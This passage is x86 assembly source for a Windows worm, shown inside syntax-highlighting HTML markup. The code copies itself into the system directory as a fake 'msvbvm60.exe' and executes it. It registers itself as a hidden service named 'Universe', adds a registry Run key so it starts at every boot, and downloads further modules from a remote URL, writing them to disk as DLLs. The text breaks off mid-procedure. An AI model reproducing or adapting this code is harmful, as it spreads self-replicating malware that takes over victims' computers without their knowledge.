</span><span class="sc0">    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'6mvb'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'xe.0'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'e'</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                       </span><span class="sc1">;create sysdir\msvbvm60.exe</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;filename</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wormname2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CopyFileA</span><span class="sc0">               </span><span class="sc1">;copy worm to sysdir</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc5">@copysz</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;create the command line</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WinExec</span><span class="sc0">                 </span><span class="sc1">;and execute worm</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;from system directory</span><span class="sc0">
</span><span class="sc5">CopyWorm</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc1">;this procedure can execute worm as service process</span><span class="sc0">
</span><span class="sc5">HideWorm</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F0000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">OpenSCManagerA</span><span class="sc0">              </span><span class="sc1">;get handle to SCM</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">e_scm0</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;to ESI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10000h</span><span class="sc0">
</span><span class="sc5">Universe</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'Universe'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">OpenServiceA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">e_scm2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">DeleteService</span><span class="sc0">               </span><span class="sc1">;delete service</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseServiceHandle</span><span class="sc0">

</span><span class="sc5">e_scm2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wormname2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F0000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Universe</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateServiceA</span><span class="sc0">              </span><span class="sc1">;and create it again</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">e_scm1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseServiceHandle</span><span class="sc0">
</span><span class="sc5">e_scm1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseServiceHandle</span><span class="sc0">          </span><span class="sc1">;close all opened handlez</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">e_scm0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetLastError</span><span class="sc0">                </span><span class="sc1">;get error code</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">                 </span><span class="sc1">;if not compatibility</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_hide</span><span class="sc0">                </span><span class="sc1">;error then quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">wormname2_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wormname2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Universe</span><span class="sc0">
</span><span class="sc5">run_key</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000002h</span><span class="sc0">               </span><span class="sc1">;modify registry so</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SHSetValueA</span><span class="sc0">             </span><span class="sc1">;worm will be executed</span><span class="sc0">
                            </span><span class="sc1">;every start of windows</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'Kernel32.dll'</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleHandleA</span><span class="sc0">            </span><span class="sc1">;get base address of K32</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_hide</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'RegisterServiceProcess'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetProcAddress</span><span class="sc0">              </span><span class="sc1">;get ptr to API</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_hide</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;register as service</span><span class="sc0">
</span><span class="sc5">end_hide</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;process under Win9x</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">HideWorm</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc1">;register service process under WinNT/2k</span><span class="sc0">
</span><span class="sc5">SVCRegister</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_dt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Universe</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">service_start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_dt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">StartServiceCtrlDispatcherA</span><span class="sc0">     </span><span class="sc1">;make a connection with</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;SCM</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_svc</span><span class="sc0">                   </span><span class="sc1">;error, continue...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ExitThread</span><span class="sc0">              </span><span class="sc1">;quit the thread</span><span class="sc0">

</span><span class="sc5">service_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_worm</span><span class="sc4">&gt;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">end_hide</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Universe</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RegisterServiceCtrlHandlerA</span><span class="sc0">     </span><span class="sc1">;register service</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;handler</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">e_svc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ss</span><span class="sc0">
</span><span class="sc5">ss_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ss</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetServiceStatus</span><span class="sc0">            </span><span class="sc1">;set the service status</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseServiceHandle</span><span class="sc0">          </span><span class="sc1">;close service handle</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">e_svc</span><span class="sc0">                   </span><span class="sc1">;and continue...</span><span class="sc0">
</span><span class="sc5">SVCRegister</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc5">DownloadModules</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_dm</span><span class="sc4">&gt;</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Universe</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetOpenA</span><span class="sc0">               </span><span class="sc1">;create the inet handle</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_dm</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0">               </span><span class="sc1">;no cache</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'http://shadowvx.gov/benny/viruses/mod.txt'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetOpenUrlA</span><span class="sc0">            </span><span class="sc1">;open URL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">err_dm1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mod_buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetReadFile</span><span class="sc0">            </span><span class="sc1">;read the list file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_dm2</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_modules</span><span class="sc0">             </span><span class="sc1">;parse URLs from there</span><span class="sc0">

</span><span class="sc5">err_dm2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetCloseHandle</span><span class="sc0">
</span><span class="sc5">err_dm1</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetCloseHandle</span><span class="sc0">         </span><span class="sc1">;close all inet handlez</span><span class="sc0">
</span><span class="sc5">end_dm</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_modules</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">l_gm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_end_gm</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">l_gm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;separate URL</span><span class="sc0">
</span><span class="sc5">l_gm2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">l_gm2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;and download new module</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">download_module</span><span class="sc0">             </span><span class="sc1">;from that URL</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">l_name</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_modules</span><span class="sc0">
</span><span class="sc5">_end_gm</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">download_module</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0">               </span><span class="sc1">;no cache</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetOpenUrlA</span><span class="sc0">            </span><span class="sc1">;open URL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">err_dm00</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@filen</span><span class="sc0">
</span><span class="sc5">lib_nam</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'msvbvm6'</span><span class="sc0">               </span><span class="sc1">;name of module stored</span><span class="sc0">
</span><span class="sc5">l_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'a.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;on the disk</span><span class="sc0">
</span><span class="sc5">@filen</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc1">;create that file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">err_dm11</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10008h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_dm22</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hMapFile</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">MapViewOfFile</span><span class="sc0">               </span><span class="sc1">;map it</span><span class="sc0">
